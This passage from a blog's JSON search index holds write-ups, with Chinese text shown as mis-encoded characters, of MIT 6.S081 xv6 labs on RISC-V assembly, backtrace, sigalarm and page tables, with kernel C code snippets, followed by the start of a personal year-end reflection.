lazy","uri":"/posts/6-s081-lab5-lazy/"},{"categories":["OS"],"content":"RISC-V assembly è¿™æ˜¯ä¸€ä¸ªç®€å•çš„RISC-Væ±‡ç¼–çƒ­èº«å…³å¡ã€‚ æˆ‘ä»¬éœ€è¦æŸ¥çœ‹user/call.asmæ¥å›ç­”ä¸€äº›é—®é¢˜ï¼Œå…¶ä¸»è¦å†…å®¹å¦‚ä¸‹ï¼š int g(int x) { 0: 1141 addi sp,sp,-16 2: e422 sd s0,8(sp) 4: 0800 addi s0,sp,16 return x+3; } 6: 250d addiw a0,a0,3 8: 6422 ld s0,8(sp) a: 0141 addi sp,sp,16 c: 8082 ret 000000000000000e \u003cf\u003e: int f(int x) { e: 1141 addi sp,sp,-16 10: e422 sd s0,8(sp) 12: 0800 addi s0,sp,16 return g(x); } 14: 250d addiw a0,a0,3 16: 6422 ld s0,8(sp) 18: 0141 addi sp,sp,16 1a: 8082 ret 000000000000001c \u003cmain\u003e: void main(void) { 1c: 1141 addi sp,sp,-16 1e: e406 sd ra,8(sp) 20: e022 sd s0,0(sp) 22: 0800 addi s0,sp,16 printf(\"%d %d\\n\", f(8)+1, 13); 24: 4635 li a2,13 26: 45b1 li a1,12 28: 00000517 auipc a0,0x0 2c: 7b850513 addi a0,a0,1976 # 7e0 \u003cmalloc+0xea\u003e 30: 00000097 auipc ra,0x0 34: 608080e7 jalr 1544(ra) # 638 \u003cprintf\u003e exit(0); 38: 4501 li a0,0 3a: 00000097 auipc ra,0x0 3e: 276080e7 jalr 630(ra) # 2b0 \u003cexit\u003e Which registers contain arguments to functions? For example, which register holds 13 in mainâ€™s call to printf? æ ¹æ®RISC-Vçš„ calling conventionï¼Œa0-a7,fa0-fa7åŒ…å«äº†å‡½æ•°çš„å‚æ•°ã€‚è°ƒç”¨printfæ—¶ï¼Œa0ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œa1æ˜¯ 12ï¼Œa2æ˜¯ 13ã€‚ Where is the call to function f in the assembly code for main? Where is the call to g? (Hint: the compiler may inline functions.) ç”±äºfå’Œgå‡½æ•°éƒ½æ˜¯ç®€å•çš„å¸¸æ•°è®¡ç®—ï¼Œä¼ é€’çš„å‚æ•°ä¹Ÿæ˜¯å¸¸æ•° 8ï¼Œæ‰€ä»¥å‡½æ•°è°ƒç”¨è¢«ç¼–è¯‘å™¨ä¼˜åŒ–æ‰äº†ï¼Œåœ¨0x26ä½ç½®ï¼Œç›´æ¥å°†å‡½æ•°è°ƒç”¨ç»“æœç«‹å³æ•° 12 è½½å…¥å¯„å­˜å™¨a1ã€‚ At what address is the function printf located? ä»ä»£ç ä¸­çœ‹ï¼Œå¾ˆæ˜¾ç„¶ï¼Œåœ¨0x638å¾—ä½ç½®ã€‚ What value is in the register ra just after the jalr to printf in main? jalræŒ‡ä»¤æ˜¯é“¾æ¥å¹¶è·³è½¬ï¼Œå°†è¿”å›åœ°å€ä¿å­˜åˆ°raå¯„å­˜å™¨ï¼Œæ‰€ä»¥åº”ä¸º0x38ã€‚ unsigned int i = 0x00646c72; printf(\"H%x Wo%s\", 57616, \u0026i); è¿è¡Œä»¥ä¸Šä»£ç ï¼Œè¾“å‡ºHE110 Worldã€‚æ•°å­— 57616 çš„ 16 è¿›åˆ¶è¡¨ç¤ºä¸º 0xE110ï¼›RISC-Vé‡‡ç”¨å°ç«¯æ³•è¡¨ç¤ºï¼Œ16 è¿›åˆ¶çš„ 72ã€6cã€64ã€00 è¡¨ç¤ºå­—ç¬¦ä¸²â€œrld\\0â€ï¼Œå¦‚æœæ”¹ä¸ºå¤§ç«¯æ³•ï¼Œåˆ™åº”åè¿‡æ¥ï¼Œå˜ä¸ºi=0x726c6400ã€‚ printf(\"x=%d y=%d\", 3); è¯¥printfè°ƒç”¨å°‘äº†ä¸€ä¸ªå‚æ•°ï¼Œæ ¹æ® calling conventionï¼Œå¯¹y=%dä¼šå–a2çš„å€¼è¿›è¡Œè¾“å‡ºã€‚ ","date":"2021-02-25","objectID":"/posts/6-s081-lab4-traps/:1:0","tags":["6.S081","traps"],"title":"6.S081 lab4 traps","uri":"/posts/6-s081-lab4-traps/"},{"categories":["OS"],"content":"Backtrace è¯¥æ­¥éª¤éœ€è¦å®ç°ä¸€ä¸ªbacktraceå‡½æ•°ï¼Œæ‰“å°å‡ºè°ƒç”¨è½¨è¿¹ï¼Œå³æ¯æ¬¡è°ƒç”¨çš„è¿”å›åœ°å€ã€‚ xv6 è¿è¡Œæ—¶çš„ stack ç»“æ„å¦‚ä¸‹å›¾ï¼š s0/fpä¸­å­˜å‚¨ç€å½“å‰çš„ frame pointerï¼Œfp-8æŒ‡å‘è¿”å›åœ°å€ï¼Œfp-16æŒ‡å‘ä¸Šä¸€ä¸ªfpåœ°å€ã€‚ æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¸æ–­æ‰“å°å½“å‰fpçš„è¿”å›åœ°å€å¹¶å‘å‰è¿½æº¯ï¼Œç›´åˆ° stack é¡¶éƒ¨ã€‚ é¦–å…ˆåœ¨kernel/riscv.hæ·»åŠ å†…è”æ±‡ç¼–å‡½æ•°ä»¥è·å–fpå€¼ï¼š static inline uint64 r_fp() { uint64 x; asm volatile(\"mv %0, s0\" : \"=r\" (x) ); return x; } ç„¶ååœ¨kernel/printf.cå®ç°backtraceï¼š void backtrace(void) { uint64 fp, top; fp = r_fp(); top = PGROUNDUP(fp); while(1) { if (fp == top) break; printf(\"%p\\n\", *(uint64*)(fp-8)); fp = *(uint64*)(fp-16); } } ä¹‹ååœ¨sys_sleepå’Œpanicä¸­åŠ å…¥å¯¹backtraceçš„è°ƒç”¨å³å¯ã€‚ ","date":"2021-02-25","objectID":"/posts/6-s081-lab4-traps/:2:0","tags":["6.S081","traps"],"title":"6.S081 lab4 traps","uri":"/posts/6-s081-lab4-traps/"},{"categories":["OS"],"content":"Alarm æœ¬å…³éœ€è¦å®ç°ä¸€ä¸ªsigalarm(interval, handler)ç³»ç»Ÿè°ƒç”¨ï¼Œcpu æ¯æ¶ˆè€— interval ä¸ª ticks åï¼Œè°ƒç”¨ä¸€æ¬¡ handler å‡½æ•°ã€‚ é¦–å…ˆè¦åœ¨user/user.hæ·»åŠ å¯¹æ–°ç³»ç»Ÿè°ƒç”¨çš„ç”¨æˆ·æ¥å£ï¼š int sigalarm(int ticks, void (*handler)()); int sigreturn(void); sigreturnæ˜¯ä¸€ä¸ªè¢«è®¾è®¡ç”¨æ¥å¸®åŠ©æˆ‘ä»¬å®ç°sigalarmçš„å‡½æ•°ï¼Œæ¯ä¸ªhandleræ‰§è¡Œç»“æŸåï¼Œéƒ½è°ƒç”¨sigreturnã€‚ é¦–å…ˆè¦åœ¨procä¸­æ·»åŠ æ–°çš„å­—æ®µï¼Œè®°å½•intervalï¼Œhandlerä»¥åŠæ‰€éœ€çš„è¾…åŠ©å˜é‡ï¼Œåœ¨allocpocä¸­å¯¹å®ƒä»¬è¿›è¡Œåˆå§‹åŒ–ï¼Œåœ¨ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œæ—¶ï¼Œä¿å­˜ç›¸åº”çš„å€¼åˆ°procä¸­ã€‚ uint64 sys_sigalarm(void) { struct proc *p = myproc(); if (argint(0, \u0026(p-\u003ealarm_interval)) \u003c 0) return -1; if (argaddr(1, \u0026(p-\u003ealarm_hanlder)) \u003c 0) return -1; return 0; } ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦åœ¨usertrapè¯†åˆ«åˆ° timer interrupt æ—¶ï¼Œè¿›è¡Œå¤„ç†ï¼Œhints å‘Šè¯‰æˆ‘ä»¬ï¼Œæ˜¯which_dev == 2ã€‚ // give up the CPU if this is a timer interrupt. if(which_dev == 2) { p-\u003epassed++; if (p-\u003epassed == p-\u003ealarm_interval) { p-\u003epassed = 0; p-\u003etrapframe-\u003eepc = p-\u003ealarm_hanlder; } yield(); } æ­¤æ—¶åªéœ€è®©sigreturnç›´æ¥è¿”å› 0ï¼Œè¿™æ ·ç®€å•åœ°æ·»åŠ ä»£ç ï¼Œå¯ä»¥è®©test0æ‰“å°å‡º alarmï¼Œä½†æ˜¯éšåï¼Œç¨‹åºä¾¿é€»è¾‘å´©æºƒï¼Œæ— æ³•é€šè¿‡æµ‹è¯•ã€‚è¿™æ˜¯å› ä¸ºå½“ kernle å¤„ç†å®Œ time interruï¼Œå›åˆ°ç”¨æˆ·æ¨¡å¼ï¼Œpc æŒ‡å‘ handler çš„ä½ç½®ï¼Œä¹‹åå¼€å§‹æ‰§è¡Œ handler å‡½æ•°ï¼Œåœ¨ handler å‡½æ•°å°¾éƒ¨ï¼Œè°ƒç”¨sigreturné™·å…¥ kernelï¼Œå¹¶æ— æ“ä½œï¼Œå†æ¬¡è¿”å›ç”¨æˆ·æ€ï¼Œæ‰§è¡Œ handler å°¾éƒ¨çš„retã€‚æ­¤æ—¶ç”¨äºretæŒ‡ä»¤çš„è¿”å›åœ°å€å¯„å­˜å™¨raæ‰€å­˜å‚¨çš„å€¼ï¼Œæ˜¯åœ¨ time interrupt ä¹‹æ—¶ï¼Œtest å‡½æ•°æ‰§è¡Œä¸­äº§ç”Ÿçš„raçš„å€¼ï¼Œå¹¶éæ˜¯ time interrupt å‘ç”Ÿæ—¶ï¼Œæ­£åœ¨æ‰§è¡Œçš„ä»£ç åœ°å€ï¼Œæ‰€ä»¥ç¨‹åºä¸èƒ½è¿”å›æ­£ç¡®ä½ç½®ï¼Œå¹¶ä¸” handler æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¿®æ”¹äº†çš„éƒ¨åˆ†å¯„å­˜å™¨ä¹Ÿéœ€è¦æ¢å¤ã€‚ äºæ˜¯ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ handler æ‰§è¡Œå‰ä¿å­˜tramframeï¼Œåœ¨æ‰§è¡Œåçš„sigreturnä¸­æ¢å¤tramframeï¼Œè®©ä»£ç è¿”å›åˆ°æ­£ç¡®çš„ä½ç½®æ‰§è¡Œï¼Œå¹¶ä½¿å¯„å­˜å™¨çš„æ•°å€¼å¤åŸã€‚åŒæ—¶ï¼Œæ ¹æ® hintsï¼Œä¸ºäº†é˜²æ­¢ handler æ‰§è¡Œè¿‡ç¨‹ä¸­è¢«é‡å¤è°ƒç”¨ï¼Œæ·»åŠ permissionå­—æ®µæ¥è¿›è¡Œæ§åˆ¶ï¼Œæ­¤å¤–ï¼Œinterval==0æ—¶ï¼Œæ„å‘³ç€å–æ¶ˆ alarmã€‚ uint64 sys_sigreturn(void) { struct proc* p = myproc(); p-\u003epermission = 1; *p-\u003etrapframe = p-\u003ealarm_frame; printf(\"ra:%p\\n\", p-\u003etrapframe-\u003era); return 0; } åœ¨usertrapä¸­ï¼š if(which_dev == 2) { p-\u003epassed++; if (p-\u003epermission \u0026\u0026 p-\u003ealarm_interval \u0026\u0026 p-\u003epassed == p-\u003ealarm_interval) { p-\u003epassed = 0; p-\u003epermission = 0; p-\u003ealarm_frame = *p-\u003etrapframe; p-\u003etrapframe-\u003eepc = p-\u003ealarm_hanlder; } yield(); } åˆ°æ­¤ï¼Œä¾¿å®Œæˆäº† lab4 trapsã€‚ æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ç‚¹ï¼Œç¬”è€…æ›¾å°è¯•åªä¿å­˜tramframeä¸­çš„caller saveå¯„å­˜å™¨ï¼Œä½†æ˜¯æ— æ³•é€šè¿‡æµ‹è¯•ã€‚æœ€ç»ˆæŸ¥çœ‹asmæ–‡ä»¶å‘ç°ï¼šcallee saveå¯„å­˜å™¨æ˜¯åœ¨è¢«è°ƒç”¨å‡½æ•°å°¾éƒ¨çš„ ret æŒ‡ä»¤å‰è¿›è¡Œæ¢å¤çš„ï¼Œä½†æ˜¯åœ¨sigreturnä¸­é€šè¿‡æ¢å¤epcçš„æ–¹å¼ï¼Œå°†pcç›´æ¥æŒ‡å‘äº†è¢« time interrupt æ‰“æ–­æ‰§è¡Œçš„ä»£ç ä½ç½®ï¼Œæ‰€ä»¥callee saveå¯„å­˜å™¨åœ¨è¢«ä¿®æ”¹åå¹¶æœªè¢«å¤åŸï¼Œæˆ‘ä»¬å¿…é¡»ä¿å­˜trapframeä¸­çš„æ‰€æœ‰å¯„å­˜å™¨ã€‚ ","date":"2021-02-25","objectID":"/posts/6-s081-lab4-traps/:3:0","tags":["6.S081","traps"],"title":"6.S081 lab4 traps","uri":"/posts/6-s081-lab4-traps/"},{"categories":["OS"],"content":"ç¯å¢ƒé…ç½® å‰ä¸¤ä¸ª lab æ¯”è¾ƒåŸºç¡€ï¼Œå°±ä¸å†™åšå®¢è®°å½•äº†ï¼Œäºæ˜¯ä» lab3 å¼€å§‹ã€‚ ç¯å¢ƒé…ç½®å‚è€ƒå®˜ç½‘ ã€‚å¦‚æœä½¿ç”¨ubuntu20.04çš„è¯ï¼Œç¯å¢ƒé…ç½®æ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦ä»qemu å®˜ç½‘ä¸‹è½½æºç ï¼Œæ‰‹åŠ¨ build å°±å®Œæˆäº†ï¼›æˆ–è€…ä½¿ç”¨archlinuxï¼Œä¸€æ¡å‘½ä»¤ä¾¿å…¨éƒ¨é…ç½®å®Œæˆã€‚ç¬”è€…ä½¿ç”¨çš„å¹³å°æ˜¯macOS 11.2.1ï¼Œä½¿ç”¨homebrewå®‰è£…çš„qemuåœ¨å‰ä¸¤ä¸ª lab æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯åœ¨ç¬¬ä¸‰ä¸ª lab å‡ºç°äº† crashï¼Œæ”¹ä¸ºä»æºç æ‰‹åŠ¨ç¼–è¯‘å®‰è£…qemu 5.1.0è§£å†³äº†ã€‚ 2021-02-24 ä¿®æ­£ï¼šåš lab4 æŸ¥çœ‹call.asmï¼Œå‘ç°.text æŒ‡ä»¤é•¿åº¦ä¸ä¸€ï¼Œæœ‰çš„ä¸º 2ï¼Œæœ‰çš„ä¸º 4ï¼Œé‚æ‰¾äººè¯·æ•™ï¼ŒçŒœæµ‹æ˜¯æŒ‡ä»¤å‹ç¼©å¯¼è‡´ï¼Œäºæ˜¯è”æƒ³åˆ°ä¹‹å‰å‡ ä¹æ‰€æœ‰äººéƒ½é‡åˆ°çš„ä¸€ä¸ªé—®é¢˜ï¼Œä½¿ç”¨ gdb æ‰“æ–­ç‚¹è°ƒè¯•æ—¶ï¼Œå‡ºç°ï¼šâ€œCannot access memory at address xxxâ€ã€‚ç»è¿‡å¤§ä½¬æŸ¥é˜…å¹¶å°è¯•ï¼Œå‘ç°åœ¨.gdbinit.tmpl-riscvä¸­åŠ å…¥set riscv use-compressed-breakpoints yeså¯ä»¥æœ‰æ•ˆè§£å†³ã€‚ ","date":"2021-02-22","objectID":"/posts/6-s081-lab3-page-tables/:1:0","tags":["6.S081","page table"],"title":"6.S081 lab3 page tables","uri":"/posts/6-s081-lab3-page-tables/"},{"categories":["OS"],"content":"Print a page table è¯¥éƒ¨åˆ†çš„å†…å®¹æ˜¯æ‰“å°å‡ºç¬¬ä¸€ä¸ªè¿›ç¨‹çš„ç”¨æˆ·é¡µè¡¨ã€‚è¿™ä¸ªéå¸¸ç®€å•ï¼š å‚ç…§freewalkå‡½æ•°ï¼Œé¦–å…ˆåœ¨kernel/vm.cæ·»åŠ vmprint: void _vmprint(pagetable_t pagetable, int level) { int j; // there are 2^9 = 512 PTEs in a page table. for(int i = 0; i \u003c 512; i++){ pte_t pte = pagetable[i]; if(pte \u0026 PTE_V){ for(j = 0; j \u003c= level; j++) { if(j == 0) printf(\"..\"); else printf(\" ..\"); } uint64 child = PTE2PA(pte); printf(\"%d: pte %p pa %p\\n\", i, pte, child); // this PTE points to a lower-level page table. if ((pte \u0026 (PTE_R | PTE_W | PTE_X)) == 0) { _vmprint((pagetable_t)child, level + 1); } } } } // print the page tables void vmprint(pagetable_t pagetable) { printf(\"page table %p\\n\", pagetable); _vmprint(pagetable, 0); } ç„¶ååœ¨exec.cä¸­æ’å…¥ä»£ç æ‰“å°ç¬¬ä¸€ä¸ªè¿›ç¨‹çš„ç”¨æˆ·é¡µè¡¨ï¼š if(p-\u003epid == 1) { vmprint(p-\u003epagetable); } å¯åŠ¨åæ‰“å°å‡ºå¦‚ä¸‹å†…å®¹ï¼š page table 0x0000000087f67000 ..0: pte 0x0000000021fd8c01 pa 0x0000000087f63000 .. ..0: pte 0x0000000021fd8801 pa 0x0000000087f62000 .. .. ..0: pte 0x0000000021fd901f pa 0x0000000087f64000 .. .. ..1: pte 0x0000000021fd840f pa 0x0000000087f61000 .. .. ..2: pte 0x0000000021fd801f pa 0x0000000087f60000 ..255: pte 0x0000000021fd9801 pa 0x0000000087f66000 .. ..511: pte 0x0000000021fd9401 pa 0x0000000087f65000 .. .. ..510: pte 0x0000000021fdd807 pa 0x0000000087f76000 .. .. ..511: pte 0x0000000020001c0b pa 0x0000000080007000 åœ¨ç”¨æˆ·åœ°å€ç©ºé—´æœ€é«˜å¤„ï¼Œ511ï¼Œ510 entry å¯¹åº”trampolineå’Œtrapframeã€‚åœ¨ç”¨æˆ·åœ°å€ç©ºé—´æœ€ä½å¤„ï¼Œ0ï¼Œ1ï¼Œ2 entry å¯¹åº”text\\dataï¼Œguard pageï¼Œstackï¼Œå¦‚æœä¿®æ”¹ä¸‹_vmprintæ‰“å°å‡ºæ›´å¤šä¿¡æ¯ï¼Œå¯ä»¥å‘ç° entry 1 çš„PTE_Uæ˜¯æ— æ•ˆçš„ï¼Œå¯ä»¥é˜²æ­¢æ ˆæº¢å‡ºã€‚é¡¶çº§é¡µè¡¨åªä½¿ç”¨åˆ°ç¬¬ 255 ä¸ª entryï¼Œå› ä¸ºxv6åªä½¿ç”¨äº† 38 ä½åœ°å€ã€‚ ","date":"2021-02-22","objectID":"/posts/6-s081-lab3-page-tables/:2:0","tags":["6.S081","page table"],"title":"6.S081 lab3 page tables","uri":"/posts/6-s081-lab3-page-tables/"},{"categories":["OS"],"content":"A kernel page table per process ç¬¬äºŒéƒ¨åˆ†æ˜¯è®©æ¯ä¸ªè¿›ç¨‹æ‹¥æœ‰å•ç‹¬çš„å†…æ ¸é¡µè¡¨ï¼Œä¸ºç¬¬ä¸‰éƒ¨åˆ†ç›´æ¥ä½¿ç”¨ç”¨æˆ·è™šæ‹Ÿåœ°å€åšå‡†å¤‡ã€‚ é¦–å…ˆåœ¨kernel/proc.hä¸­çš„struct procå®šä¹‰ä¸­æ·»åŠ  pagetable_t kpagetable; ä»¿ç…§kvminitï¼Œå®ç°ä¸€ä¸ªåˆå§‹åŒ–è¿›ç¨‹å†…æ ¸é¡µè¡¨çš„å‡½æ•°ï¼š pagetable_t proc_kvminit(void) { int i; pagetable_t proc_kpagetable = uvmcreate(); if (proc_kpagetable == 0) { return 0; } for(i = 1; i \u003c 512; i++) { proc_kpagetable[i] = kernel_pagetable[i]; } ukvmmap(proc_kpagetable, UART0, UART0, PGSIZE, PTE_R | PTE_W); ukvmmap(proc_kpagetable, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W); ukvmmap(proc_kpagetable, CLINT, CLINT, 0x10000, PTE_R | PTE_W); ukvmmap(proc_kpagetable, PLIC, PLIC, 0x400000, PTE_R | PTE_W); return proc_kpagetable; } void ukvmmap(pagetable_t kernel_pagetable ,uint64 va, uint64 pa, uint64 sz, int perm) { if(mappages(kernel_pagetable, va, sz, pa, perm) != 0) panic(\"kvmmap\"); } æ ¹æ®åç»­å®éªŒï¼Œæˆ‘ä»¬èƒ½ä¿®æ”¹çš„å†…æ ¸åœ°å€ç©ºé—´ä¸è¶…è¿‡é¡¶çº§é¡µè¡¨çš„ç¬¬ä¸€ä¸ª entry çš„åœ°å€èŒƒå›´ï¼Œæ‰€ä»¥æˆ‘ä»¬å’Œkernel_pagetableå…±äº«å…¶ä»– entryï¼Œç›´æ¥è¿›è¡Œå¤åˆ¶ï¼Œè¿™æ ·èƒ½å¤ŸèŠ‚çº¦æ¬¡çº§é¡µè¡¨å ç”¨çš„å†…å­˜ç©ºé—´ã€‚ kernel/proc.cä¸­çš„allocprocå‡½æ•°ï¼Œè´Ÿè´£åˆ†é…ã€åˆå§‹åŒ–è¿›ç¨‹ï¼Œåœ¨å…¶ä¸­å¦‚ä¸‹è°ƒç”¨ï¼š p-\u003ekpagetable = proc_kvminit(); if (p-\u003ekpagetable == 0) { freeproc(p); release(\u0026p-\u003elock); return 0; } ä¹‹åï¼Œå®˜ç½‘çš„hintæåˆ°éœ€è¦ä¸ºæ¯ä¸ªè¿›ç¨‹åˆå§‹åŒ–kernel stackï¼Œå¯èƒ½éœ€è¦å°†proinitä¸­çš„éƒ¨åˆ†ä»£ç è½¬ç§»åˆ°allocprocä¸­ï¼Œç”±äºæˆ‘ä»¬å’Œkernel_pagetableå…±äº«äº†é¡¶çº§é¡µè¡¨ entry 1 æ„å¤–çš„æ‰€æœ‰é¡µè¡¨ï¼Œæ‰€ä»¥ä»å¯ä»¥å°†kernel stackçš„åˆå§‹åŒ–ä»£ç ç•™åœ¨procinitä¸­ã€‚ æ¥ä¸‹æ¥ï¼Œä¿®æ”¹schedulerï¼Œå½“è°ƒåº¦åˆ°è¿›ç¨‹æ‰§è¡Œæ—¶ï¼Œå°†è¿›ç¨‹çš„å†…æ ¸é¡µè¡¨è½½å…¥stapå¯„å­˜å™¨ï¼ˆå‚è€ƒkvminithartï¼‰ï¼Œå½“æ²¡æœ‰è¿›ç¨‹è¿è¡Œæ—¶ï¼Œä½¿ç”¨kernel_pagetableï¼š if(p-\u003estate == RUNNABLE) { // Switch to chosen process. It is the process's job // to release its lock and then reacquire it // before jumping back to us. p-\u003estate = RUNNING; c-\u003eproc = p; w_satp(MAKE_SATP(p-\u003ekpagetable)); sfence_vma(); swtch(\u0026c-\u003econtext, \u0026p-\u003econtext); // Process is done running for now. // It should have changed its p-\u003estate before coming back. c-\u003eproc = 0; kvminithart(); found = 1; } ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦åœ¨free_procä¸­æ·»åŠ é‡Šæ”¾å†…æ ¸é¡µè¡¨çš„ä»£ç ï¼š if(p-\u003ekpagetable) { proc_freekpagetable(p-\u003ekpagetable); } void proc_freekpagetable(pagetable_t kpagetable) { pte_t pte = kpagetable[0]; pagetable_t level1 = (pagetable_t) PTE2PA(pte); for (int i = 0; i \u003c 512; i++) { pte_t pte = level1[i]; if (pte \u0026 PTE_V) { uint64 level2 = PTE2PA(pte); kfree((void *) level2); level1[i] = 0; } } kfree((void *) level1); kfree((void *) kpagetable); } æ³¨æ„ï¼Œç”±äºå’Œkernel_pagetableè¿›è¡Œäº†å…±äº«ï¼Œæ‰€ä»¥ä»…é‡Šæ”¾ç¬¬ä¸€ä¸ª entry å¯¹åº”çš„æ¬¡çº§é¡µè¡¨ï¼›å¦‚æœæ²¡æœ‰å…±äº«åˆ™éœ€é‡Šæ”¾æ•´ä¸ªä¸‰çº§é¡µè¡¨ï¼ˆéƒ½ä¸èƒ½é‡Šæ”¾ç‰©ç†å†…å­˜ï¼‰ã€‚ æ­¤å¤–ï¼Œå¦‚æœå°†kernel stackçš„åˆå§‹åŒ–ä»£ç æ”¾ç½®åœ¨äº†allocprocä¸­ï¼Œé‚£ä¹ˆéœ€è¦åœ¨freeprocä¸­é‡Šæ”¾å¹¶ ummapkernel stackï¼Œå¹¶ä¸”éœ€è¦åœ¨kvmpaåšå‡ºä¿®æ”¹ï¼Œä½¿ç”¨ï¼š pte = walk(myproc()-\u003ekpagetable, va, 0); ","date":"2021-02-22","objectID":"/posts/6-s081-lab3-page-tables/:3:0","tags":["6.S081","page table"],"title":"6.S081 lab3 page tables","uri":"/posts/6-s081-lab3-page-tables/"},{"categories":["OS"],"content":"Simplify copyin/copyinstr è¯¥éƒ¨åˆ†éœ€è¦åˆ©ç”¨ç¬¬äºŒéƒ¨åˆ†ä¸­çš„è¿›ç¨‹å†…æ ¸é¡µè¡¨ç®€åŒ–copyin/copyinstrå‡½æ•°ï¼Œä½¿ä¹‹ä¸éœ€è¦ä¼ é€’ç”¨æˆ·é¡µè¡¨ã€‚ æ ¹æ®æç¤ºï¼Œå°†è¿›ç¨‹çš„ç”¨æˆ·é¡µè¡¨å¤åˆ¶åˆ°å…¶å†…æ ¸é¡µè¡¨ä¸­ï¼Œè¿™æ ·æ¯ä¸ªè¿›ç¨‹å†…æ ¸é¡µè¡¨éƒ½æœ‰å…¶å¯¹åº”ç”¨æˆ·é¡µè¡¨çš„å‰¯æœ¬ã€‚å¤åˆ¶çš„ç”¨æˆ·é¡µè¡¨è™šæ‹Ÿåœ°å€ä¸èƒ½è¶…è¿‡PLICï¼Œä¹‹ä¸Šæ˜¯kernelå æœ‰çš„åœ°å€ç©ºé—´ï¼Œæ‰€ä»¥éœ€è¦åˆ¤æ–­ã€‚ void u2kvmcopy(pagetable_t pagetable, pagetable_t kpagetable, uint64 oldsz, uint64 newsz) { uint64 va; pte_t *upte; pte_t *kpte; if(newsz \u003e= PLIC) panic(\"u2kvmcopy: newsz too large\"); for (va = oldsz; va \u003c newsz; va += PGSIZE) { upte = walk(pagetable, va, 0); kpte = walk(kpagetable, va, 1); *kpte = *upte; // because the user mapping in kernel page table is only used for copyin // so the kernel don't need to have the W,X,U bit turned on *kpte \u0026= ~(PTE_U|PTE_W|PTE_X); } } æ³¨æ„å°†å¤åˆ¶åˆ°å†…æ ¸é¡µè¡¨çš„ entry å–æ¶ˆPTE_Uæƒé™ã€‚ ä¹‹ååœ¨exec/fork/sbrkä¸­ï¼Œæ¯æ¬¡ç”¨æˆ·é¡µè¡¨å‘ç”Ÿæ”¹å˜æ—¶ï¼Œå¤åˆ¶åˆ°å†…æ ¸é¡µè¡¨ä¸­ã€‚ å¯¹äºexec: if(p-\u003epid == 1) { vmprint(p-\u003epagetable); } u2kvmcopy(p-\u003epagetable, p-\u003ekpagetable, 0, p-\u003esz); å¯¹äºfork: u2kvmcopy(np-\u003epagetable, np-\u003ekpagetable, 0, np-\u003esz); release(\u0026np-\u003elock); return pid; å¯¹äºsbrkï¼Œä¿®æ”¹growproc: if(n \u003e 0){ if (PGROUNDUP(sz + n) \u003e= PLIC) return -1; if((sz = uvmalloc(p-\u003epagetable, sz, sz + n)) == 0) { return -1; } } else if(n \u003c 0){ sz = uvmdealloc(p-\u003epagetable, sz, sz + n); // clean that pte bits } u2kvmcopy(p-\u003epagetable, p-\u003ekpagetable, p-\u003esz, sz); ä¹‹åï¼Œåœ¨userinitä¸­ï¼Œå°†ç¬¬ä¸€ä¸ªè¿›ç¨‹çš„ç”¨æˆ·é¡µè¡¨å¤åˆ¶åˆ°å†…æ ¸é¡µè¡¨ï¼š p-\u003estate = RUNNABLE; u2kvmcopy(p-\u003epagetable, p-\u003ekpagetable, 0, p-\u003esz); release(\u0026p-\u003elock); æœ€åï¼Œå°†åŸcpoyin/copyinsträ¿®æ”¹ä¸ºå¯¹cpoyin_new/copyinstr_newçš„è°ƒç”¨å³å¯ã€‚ åœ¨copyin_newä¸­ï¼Œåšäº†srcva + len \u003c srcvaåˆ¤æ–­æ¡ä»¶ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢lenè¿‡å¤§ï¼Œå¯¼è‡´æº¢å‡ºã€‚ ","date":"2021-02-22","objectID":"/posts/6-s081-lab3-page-tables/:4:0","tags":["6.S081","page table"],"title":"6.S081 lab3 page tables","uri":"/posts/6-s081-lab3-page-tables/"},{"categories":["æ„Ÿæƒ³"],"content":"2020 åºšå­é¼ å¹´ï¼Œåœ¨å®¶ä¸Šäº†åŠå¹´ç½‘è¯¾ï¼Œæ…µæ‡’åœ°èººå°¸ï¼ŒåŒæ—¶åˆåœ¨ç„¦è™‘æ„Ÿçš„é©±ä½¿ä¸‹æˆ˜æˆ˜å…¢å…¢åœ°å½“ä¸ªåšé¢˜å®¶ã€‚è€Œåï¼ŒäºŒè¿›å®«å®ä¹ ï¼ŒåŒæ—¶å‚åŠ å¤ä»¤è¥ï¼Œæ‹¿åˆ° offerï¼›å›½åº†ç¦»èŒï¼Œè¿›å…¥å®éªŒå®¤ï¼Œæˆä¸ºä¸´æ—¶å·¥ã€‚ä¸€ç›´åœ¨å¿™ç¢Œï¼Œä¸€ç›´åœ¨ç„¦è™‘ã€‚ ã€Œå¾ä¹‹å¤§æ‚£ï¼Œå› æœ‰å¾èº«ã€ï¼Œæˆé•¿çš„ç»å†ï¼Œè®©æˆ‘æ€»æ˜¯è¢«ã€Œç„¦è™‘ã€äºŒå­—å›°æ‰°ã€‚å¯¹è‡ªå·±æƒ³åšçš„äº‹ï¼Œéš”å¾—å¾ˆä¹…ä¾¿å¼€å§‹è®¡åˆ’ï¼Œæœ‰ä¸€ç‚¹ä¸é¡ºæ„ä¾¿ç„¦è™‘å¾—ä¸è¡Œã€‚äººç”Ÿä¸­å¹¶ä¸æ˜¯å¾ˆå¿™çš„é˜¶æ®µï¼Œä¹Ÿå› ä¸ºç„¦è™‘å˜å¾—æ— ç«¯å¿™ç¢Œã€‚å¥½åœ¨è¿æ°”ä¸é”™ï¼Œè®¸å¤šç›®æ ‡éƒ½å®ç°äº†ï¼Œå¯¹è‡ªå·±çš„å‘å±•ä¹Ÿæœ‰äº†å¤§è‡´çš„è§„åˆ’ã€‚ å‘Šåˆ«åºšå­é¼ å¹´ï¼Œæˆ‘å¸Œæœ›è‡ªå·±èƒ½å…‹åˆ¶ç„¦è™‘çš„å¿ƒå¢ƒï¼Œèƒ½é™ä¸‹æ¥ï¼Œåšå¥½è‡ªå·±æ‰‹ä¸Šçš„äº‹ï¼Œæ½œå¿ƒè¯»æ¯ä¸€ç¯‡è®ºæ–‡ï¼Œåƒä¸€ä¸ªå·¥ç¨‹å¸ˆä¸€æ 